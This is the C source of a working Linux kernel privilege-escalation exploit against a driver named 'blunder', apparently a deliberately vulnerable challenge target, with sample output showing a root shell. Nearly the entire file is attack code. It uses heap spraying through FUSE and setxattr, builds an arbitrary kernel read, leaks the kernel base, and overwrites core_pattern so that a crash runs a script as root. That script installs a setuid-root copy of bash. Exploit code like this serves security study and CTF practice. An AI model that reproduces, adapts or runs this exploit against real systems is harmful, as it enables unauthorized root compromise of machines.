/*
vagrant@ubuntu2204:~$ ./exploit
	Mounting FUSE fs
	setting up arb_read
	[2444] 5 processes
	[2444] found adjacents: ffff8d88c2e73d80 and ffff8d88c2e73e00
	[2454] adjacent1 turn
	[2454] adjacent1 done
	[2453] adjacent2 turn
	[2453] checking if arb read works, we might crash here if we failed the reallocation
	[2453] adjacent2 done
	kernel base: ffffffffb8400000
	blunder_buffer suitable: free=65686361, buffer_size=2765
	segfaulting child
	dropping shell by Klecko

bash-5.1# whoami
	root
*/

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <assert.h>
#include <errno.h>
#include <sched.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <linux/kvm.h>
#include <sys/socket.h>
#include "common.h"
#include "blunder.h"
#include "spray.h"

// 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64
#define OFFSET_CORE_PATTERN 0x2055600
#define OFFSET_NO_LLSEEK 0x38A9D0

// 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64
// #define OFFSET_CORE_PATTERN 0x2055460
// #define OFFSET_NO_LLSEEK 0x38A670

#define SPRAY_NUM_OBJECTS 32
#define PRIV_ESC_TMP_FILE "/tmp/x"
#define PRIV_ESC_CORE_PATTERN ("|" PRIV_ESC_TMP_FILE)

#define RB_BLACK 1



int g_fd = -1;
void* g_p = NULL;

void open_and_mmap_driver() {
	if (g_fd != -1)
		close(g_fd);
	if (g_p)
		munmap(g_p, 0x1000);
	g_fd = open("/dev/blunder", O_RDWR);
	error_on(g_fd < 0, "open");
	g_p = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, g_fd, 0);
	error_on(g_p == MAP_FAILED, "mmap g_p");
	error_on(mprotect(g_p, 0x1000, PROT_READ|PROT_WRITE) == -1, "mprotect g_p");
}

int send_blunder_message_nocheck(void* data, size_t data_size, int* fds, size_t num_fds) {
	struct blunder_user_message umsg = {
		.handle = getpid(),
		.data = data,
		.data_size = data_size,
		.fds = fds,
		.num_fds = num_fds,
	};
	return ioctl(g_fd, IOCTL_BLUNDER_SEND_MSG, &umsg);
}

void send_blunder_message(void* data, size_t len, int* fds, size_t num_fds) {
	error_on(send_blunder_message_nocheck(data, len, fds, num_fds) < 0, "send_msg");
}

#define N_PROCS 5
#define SIGNAL_NOTHING    0
#define SIGNAL_ADJACENT1 1
#define SIGNAL_ADJACENT2  2
#define SIGNAL_ADJACENT1_FINISHED 3
#define SIGNAL_RELEASE 4
#define SIGNAL_FINISHED 5
#define SIGNAL_ADJACENT1_CAN_EXIT 6

// Returns id from 0 to N_PROCS - 1
size_t fork_and_get_id() {
	size_t id = 1;
	while (true) {
		int pid = fork();
		if (pid == 0) {
			return id;
		} else if (id == N_PROCS - 1) {
			return 0;
		}
		id++;
	}
}

void set_cpu(int cpu_id) {
	cpu_set_t cpu;
	CPU_ZERO(&cpu);
	CPU_SET(cpu_id, &cpu);
	sched_setaffinity(0, sizeof(cpu), &cpu);
}


// Stuff filled by `setup_arb_read` and used by `arb_read`
struct {
	// The payload we are sending to the fake blunder_buffer to overwrite a
	// blunder_proc and link the fake message.
	struct blunder_proc* proc;

	// The fake message we are linking to the blunder_proc. Changing its `buffer`
	// field allows us to control the arb_read. It is stored in the mapping, so
	// we know its kernel address and can link it to the proc.
	struct blunder_message* fake_msg;

	// The kernel address of the blunder_proc we are overwriting. This is also
	// the address of the data of the fake bufffer, so calling IOCTL_BLUNDER_FREE_BUF
	// on this will set the fake buffer as free.
	uint64_t blunder_proc_addr;

} arb_read_payload;

uint64_t arb_read(uint64_t addr);

size_t setup_arb_read(uint64_t* shared_mem) {
	size_t id = fork_and_get_id();
	int pid = getpid();
	set_cpu(1);

	if (id == 0) {
		printf("[%d] %d processes\n", pid, N_PROCS);
		// Wait for processes to finish
		for (size_t i = 1; i < N_PROCS; i++) {
			while (shared_mem[i] == 0)
				sched_yield();
		}

		// Each process has submitted its blunder_proc address. Look for two
		// processes with adjacent blunder_procs.
		size_t id1 = 0, id2 = 0;
		for (size_t i = 1; i < N_PROCS-1; i++) {
			for (size_t j = i+1; j < N_PROCS; j++) {
				if (shared_mem[i] - shared_mem[j] == 0x80) {
					id1 = j;
					id2  = i;
					break;
				} else if (shared_mem[j] - shared_mem[i] == 0x80) {
					id1 = i;
					id2  = j;
					break;
				}
			}
		}

		if (id1 == 0 && id2 == 0) {
			for (size_t i = 1; i < N_PROCS; i++)
				shared_mem[i] = SIGNAL_RELEASE;
			die("[%d] no overflow available, try again :(\n", pid);
		}

		printf("[%d] found adjacents: %lx and %lx \n", pid,
		       shared_mem[id1], shared_mem[id2]);

		// Notify its role to each process
		shared_mem[id1] = SIGNAL_ADJACENT1;
		shared_mem[id2] = SIGNAL_ADJACENT2;
		shared_mem[id1 + N_PROCS] = id2;
		shared_mem[id2 + N_PROCS] = id1;
		for (size_t i = 1; i < N_PROCS; i++) {
			if (i == id1 || i == id2)
				continue;
			shared_mem[i] = SIGNAL_NOTHING;
		}

		// Note this and adjacent2 are the only two processes that return
		return id;
	}

	// Setup spray. Do this before open and mmaping so we can do kmalloc, free
	// and kmalloc as fast as possible.
	char spray[128];
	memset(spray, 0, sizeof(spray));
	struct blunder_buffer* fake_buffer = spray + sizeof(spray) - sizeof(struct blunder_buffer);
	*fake_buffer = (struct blunder_buffer) {
		.buffers_node.next = 0,
		.buffers_node.prev = 0,
		.free = 1,
		.buffer_size = sizeof(struct blunder_proc),
		.data_size = 0,
		.offsets_size = 0,
	};
	spray_setup(spray, sizeof(spray), SPRAY_NUM_OBJECTS);

	open_and_mmap_driver();

	// Send blunder_message so that initial blunder_buffer is splitted
	char data[0x10];
	send_blunder_message(data, 0x10, NULL, 0);

	// Get leaks, write blunder_proc address to shared mem
	struct blunder_buffer* buf = g_p;
	struct blunder_buffer* splitted_buf = g_p + 0x40;
	uint64_t mapping_addr = splitted_buf->buffers_node.prev;
	uint64_t blunder_proc_addr = (uint64_t)buf->buffers_node.prev - 0x48;
	shared_mem[id] = blunder_proc_addr;

	// Wait id 0 to answer
	while (shared_mem[id] == blunder_proc_addr)
		sched_yield();

	bool im_adjacent1 = false;
	if (shared_mem[id] == SIGNAL_ADJACENT1) {
		// Our task is to free our blunder_proc and replace it with a fake
		// blunder_buffer. Adjacent2 will link that fake blunder buffer to his
		// list, and will overflow into his blunder_proc.
		printf("[%d] adjacent1 turn\n", pid);
		im_adjacent1 = true;

		// Release blunder_proc
		munmap(g_p, 0x1000);
		g_p = NULL;
		close(g_fd);
		g_fd = -1;

		// Replace our blunder_proc with spray
		spray_do();

		printf("[%d] adjacent1 done\n", pid);
		shared_mem[id] = SIGNAL_ADJACENT1_FINISHED;


	} else if (shared_mem[id] == SIGNAL_ADJACENT2) {
		// Our task is to link the fake blunder buffer that adjacent1 created
		// into our list. That way, we'll be able to send a message to overwrite
		// our blunder_proc, and link a fake message into our list.

		// Wait for adjacent1 to finish
		size_t id1 = shared_mem[id + N_PROCS];
		while (shared_mem[id1] != SIGNAL_ADJACENT1_FINISHED)
			sched_yield();

		printf("[%d] adjacent2 turn\n", pid);

		// Hopefully adjacent1 has reallocated the blunder_proc right before ours
		// with a fake blunder_buffer. Link it to our list.
		buf->buffers_node.next = blunder_proc_addr - sizeof(struct blunder_buffer);

		// Create fake blunder_message structure
		arb_read_payload.fake_msg = g_p + 0x800;
		*arb_read_payload.fake_msg = (struct blunder_message) {
			.entry.next = blunder_proc_addr + offsetof(struct blunder_proc, messages),
			.entry.prev = blunder_proc_addr + offsetof(struct blunder_proc, messages),
			.buffer = NULL, // this will be ADDR_TO_READ - 0x20.
		};

		// Setup message, which will overflow into our blunder_proc. We link the
		// fake message to our list.
		arb_read_payload.proc = malloc(sizeof(struct blunder_proc));
		*arb_read_payload.proc = (struct blunder_proc) {
			.refcount = 2,
			.lock = 0,
			.pid = getpid(),
			.dead = 0,
			 // this is the state of the root node of a rbtree:
			.rb_node = (struct rb_node) {
				.__rb_parent_color = RB_BLACK,
				.rb_left = NULL,
				.rb_right = NULL,
			},
			.alloc = (struct blunder_alloc) {
				.lock = 0,
				.mapping = mapping_addr,
				.mapping_size = 0x1000,
				.user_buffer_offset = 0,
				 // address of our fake blunder buffer:
				.buffers.next = blunder_proc_addr - sizeof(struct blunder_buffer),
				.buffers.prev = blunder_proc_addr - sizeof(struct blunder_buffer),
			},
			// address of our fake blunder_message:
			.messages.next = mapping_addr + 0x800,
			.messages.prev = mapping_addr + 0x800,
		};

		arb_read_payload.blunder_proc_addr = blunder_proc_addr;

		// All that's left is to the buffer of the fake blunder message, to send
		// blunder_proc which will link that message to our list, and to receive
		// the message back.

		// Tell other processes to release resources and exit. Then, wait for
		// them to finish. We need this to happen because we need to be the only
		// process with a blunder_proc, since we will overwrite our rb_node
		// to be the root node.
		for (size_t i = 1; i < N_PROCS; i++)
			shared_mem[i] = SIGNAL_RELEASE;
		for (size_t i = 1; i < N_PROCS; i++) {
			if (i == id) continue;
			while (shared_mem[i] != SIGNAL_FINISHED)
				sched_yield();
		}

		// Check arb_read primitive works
		printf("[%d] checking if arb read works, we might crash here if we "
		       "failed the reallocation\n", pid);
		*(uint64_t*)(g_p + 0xa00) = 0x4141414141414141;
		if (arb_read(mapping_addr + 0xa00) != 0x4141414141414141)
			die("error with arb read :(\n");

		// Note this and the parent are the only two processes that return
		printf("[%d] adjacent2 done\n", pid);
		return id;
	}

	// Wait for adjacent2 to tell us to release. Adjacent1 already released.
	while (shared_mem[id] != SIGNAL_RELEASE)
		sched_yield();
	if (!im_adjacent1) {
		close(g_fd);
		munmap(g_p, 0x1000);
	}
	shared_mem[id] = SIGNAL_FINISHED;

	// If we are adjacent1 we have threads blocked in `setxattr`, and we must
	// stay alive so the spray isn't lost
	if (im_adjacent1) {
		while (shared_mem[id] != SIGNAL_ADJACENT1_CAN_EXIT)
			sched_yield();
		spray_free();
	}
	exit(EXIT_SUCCESS);
}

uint64_t arb_read(uint64_t addr) {
	if (arb_read_payload.fake_msg == NULL || arb_read_payload.proc == NULL ||
	    arb_read_payload.blunder_proc_addr == 0)
		die("arb_read_payload not present. forgot to call setup_arb_read?");

	// Set address we want to read from
	arb_read_payload.fake_msg->buffer = addr - offsetof(struct blunder_buffer, data_size);

	// Overwrite our blunder_proc, linking the fake_msg
	send_blunder_message(arb_read_payload.proc, sizeof(struct blunder_proc), NULL, 0);

	// Set the blunder buffer as free so we can reuse it in the future
	ioctl_chk(g_fd, IOCTL_BLUNDER_FREE_BUF, arb_read_payload.blunder_proc_addr);

	// Receive the message. This will do umsg.data_size = fake_msg->buffer->data_size.
	struct blunder_user_message umsg;
	memset(&umsg, 0, sizeof(umsg));
	ioctl_chk(g_fd, IOCTL_BLUNDER_RECV_MSG, &umsg);

	return umsg.data_size;
}

int main() {
	spray_init_fuse_fs();

	uint64_t* shared_mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
	                            MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	error_on(shared_mem == MAP_FAILED, "mmap shared_mem");

	printf("setting up arb_read\n");
	size_t id = setup_arb_read(shared_mem);
	if (id == 0) {
		// We are the parent. Wait for everyone to finish and drop shell.
		int wstatus;
		for (size_t i = 1; i < N_PROCS; i++) {
			error_on(wait(&wstatus) == -1, "wait");
			if (!WIFEXITED(wstatus)) die("child process didn't terminate normally\n");
			if (WEXITSTATUS(wstatus) != 0) die("child process didn't terminate with EXIT_SUCCESS\n");
		}
		printf("dropping shell by Klecko\n\n");
		system("/tmp/bash -p");
		exit(EXIT_SUCCESS);
	}

	// We are the child with arb_read power.
	// Create a child that will send a message to himself with a file descriptor
	// and tell us the address of his blunder_proc. That way we can read the
	// struct file and get kernel text leak.
	shared_mem[0] = 0;
	if (!fork()) {
		// Child
		open_and_mmap_driver();

		// Send blunder_message that will be linked
		int fd_msg = STDIN_FILENO;
		char data[0x10];
		send_blunder_message(data, 0x10, &fd_msg, 1);

		// Get blunder_proc address
		struct blunder_buffer* buf = g_p;
		uint64_t addr = (uint64_t)buf->buffers_node.prev - 0x48;

		// Send it to parent
		shared_mem[0] = addr;

		while (shared_mem[0] == addr)
			sched_yield();
		exit(EXIT_SUCCESS);
	}

	// Wait for child to finish
	while (shared_mem[0] == 0)
		sched_yield();

	// Get the address of his blunder_proc and get leak
	uint64_t child_blunder_proc_addr = shared_mem[0];
	uint64_t message_addr = arb_read(child_blunder_proc_addr + offsetof(struct blunder_proc, messages));
	uint64_t files_addr = arb_read(message_addr + 6*8);
	uint64_t file_addr = arb_read(files_addr);
	uint64_t f_op_addr = arb_read(file_addr + 0x28);
	uint64_t no_llseek_addr = arb_read(f_op_addr + 0x8);
	uint64_t kernel_base = no_llseek_addr - OFFSET_NO_LLSEEK;
	shared_mem[0] = 0;
	error_on(wait(NULL) == -1, "wait2");
	printf("kernel base: %lx\n", kernel_base);
	if ((kernel_base & 0xFFF) != 0)
		die("kernel base seems to be wrong. maybe kernel offsets need to be updated?\n");

	// We want to overwrite core_pattern. Make sure there's a valid fake
	// blunder_buffer nearby.
	uint64_t core_pattern_addr = kernel_base + OFFSET_CORE_PATTERN;
	uint64_t payload_addr = core_pattern_addr - 0x90 + 0x18;
	uint64_t target_buf_addr = payload_addr - sizeof(struct blunder_buffer);
	uint64_t free_addr = target_buf_addr + offsetof(struct blunder_buffer, free);
	uint64_t buffer_size_addr = target_buf_addr + offsetof(struct blunder_buffer, buffer_size);
	uint64_t is_free = arb_read(free_addr) & 0xFFFFFFFF;
	uint64_t buffer_size = arb_read(buffer_size_addr);
	if (buffer_size < 16 || buffer_size > BLUNDER_MAX_MAP_SIZE)
		die("error: buffer_size = %#lx, needed >= 0x10 and <= %#x :(\n", buffer_size, BLUNDER_MAX_MAP_SIZE);
	if (is_free == 0)
		die("error: free = 0, needed nonzero :(\n");
	printf("blunder_buffer suitable: free=%lx, buffer_size=%lx\n", is_free, buffer_size);

	// Prepare payload. Read everything we are going to overwrite so we don't
	// change anything.
	uint8_t payload[core_pattern_addr - payload_addr + sizeof(PRIV_ESC_CORE_PATTERN)];
	for (size_t i = 0; i < core_pattern_addr - payload_addr; i+=8)
		*(uint64_t*)(payload + i) = arb_read(payload_addr + i);
	strcpy(payload + core_pattern_addr - payload_addr, PRIV_ESC_CORE_PATTERN);

	// Copy it to the end of a page so copy_from_user fails and we don't
	// overwrite more than needed due to a too big buffer_size
	void* p = mmap((void*)0xcacabaca000, 0x1000, PROT_READ|PROT_WRITE,
	               MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	error_on(p == MAP_FAILED, "mmap 0xcacabaca000");
	void* payload_ptr = p + 0x1000 - sizeof(payload);
	memcpy(payload_ptr, payload, sizeof(payload));

	// Link blunder_buffer. We need to reset the driver because our buffers list
	// head now points to the fake buffer placed to overwrite our blunder_proc.
	// Once we do this, we lose our arb_read primitive, but we don't need it
	// anymore.
	open_and_mmap_driver();
	struct blunder_buffer* buf = g_p;
	buf->buffers_node.next = payload_addr - sizeof(struct blunder_buffer);
	buf->free = 0;

	// Send payload to overwrite core_pattern
	int ret = send_blunder_message_nocheck(payload_ptr, buffer_size, NULL, 0);
	assert(ret == -1 && errno == EFAULT);

	// Trigger core_pattern
	system("echo '"
	           "#!/bin/bash\n"
	           "cp /usr/bin/bash /tmp/bash\n"
	           "chown root:root /tmp/bash\n"
	           "chmod 4755 /tmp/bash"
	       "' > " PRIV_ESC_TMP_FILE);
	system("chmod +x " PRIV_ESC_TMP_FILE);
	printf("segfaulting child\n");
	int pid = fork();
	if (!pid) {
		*(uint64_t*)0 = 0;
	}
	error_on(waitpid(pid, NULL, 0) == -1, "wait3");

	// We don't need the reallocation anymore. Tell adjacent1 he can exit.
	for (size_t i = 1; i < N_PROCS; i++)
		shared_mem[i] = SIGNAL_ADJACENT1_CAN_EXIT;

	// We are done here. Process with id 0, who has stdin, will drop shell.
}
